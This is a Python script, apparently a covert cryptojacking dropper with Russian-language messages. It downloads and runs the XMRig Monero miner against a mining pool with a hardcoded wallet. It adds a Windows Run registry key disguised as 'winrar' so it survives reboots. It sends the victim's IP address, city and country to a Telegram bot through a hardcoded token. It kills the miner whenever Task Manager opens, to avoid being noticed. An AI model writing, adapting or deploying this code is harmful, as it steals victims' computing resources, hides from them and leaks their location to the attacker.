import psutil
import subprocess
import asyncio
from aiogram import Bot
import requests
from winreg import *
import os
import random
import zipfile

bot_token = '6735583674:AAEohpENMoiu8NqBgYWObUEYd6rTJsLzY9A'
path_to_miner = os.path.realpath(__file__)
winreg_path = path_to_miner[:-3]

chat_id = '-4170424212'

def download_file(url, save_path):
    response = requests.get(url)
    with open(save_path, 'wb') as f:
        f.write(response.content)
    print("Файл успешно скачан и сохранен по пути:", save_path)

def unzip_file(zip_path, extract_to):
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extract_to)

def get_ip_info():
    response = requests.get('https://ipinfo.io')
    data = response.json()
    return data

def win_reg_min():
	#path = os.path.join(os.path.abspath(os.curdir)) + 
	key_my = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, KEY_ALL_ACCESS)
	SetValueEx(key_my, 'winrar', 0, REG_SZ, winreg_path + ".py")
	CloseKey(key_my)

async def check_task_manager(bot: Bot):
    while True:
        for proc in psutil.process_iter(['pid', 'name']):
            if "Taskmgr.exe" in proc.info['name']:
                ip_info = get_ip_info()
                await bot.send_message(chat_id, f"IP: {ip_info['ip']}\nCITY: {ip_info['city']}\nCOUNTRY: {ip_info['country']}\nTask Manager открыт. Замораживаем процесс майнера.❌")
                subprocess.Popen(["taskkill", "/F", "/IM", "xmrig.exe"], shell=True)  # Завершение процесса майнера #aida
                return
        await asyncio.sleep(1)

async def start_miner(bot: Bot):
    github_file_url = 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip'
    save_file_path = 'E:\\Programs\\winrar\\xmrig-6.21.0-gcc-win64.zip'
    download_file(github_file_url, save_file_path)
    unzip_file(save_file_path, 'E:\\Programs\\winrar\\xmrig_extract' + str(random.randint(0,999)))
    xmrig_path = 'E:\\Programs\\winrar\\xmrig_extract\\xmrig-6.21.0\\xmrig.exe --url pool.hashvault.pro:7777 --user 44g61Gx1EyNW5X4f6p7jnJCAytVQWUjv3R77arbsfz7EEmk81E27aoY4Gwm8Q9Bb8VKtQdo9hFtun8fXQPXgzyrpGra9Ssb --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14'
    subprocess.Popen(xmrig_path, shell=True)
    ip_info = get_ip_info()
    win_reg_min()
    await bot.send_message(chat_id, f"IP: {ip_info['ip']}\nCITY: {ip_info['city']}\nCOUNTRY: {ip_info['country']}\nМайнер успешно запущен. ✅")
    await check_task_manager(bot)

async def main():
    bot = Bot(token=bot_token)
    await start_miner(bot)

if __name__ == "__main__":
    asyncio.run(main())
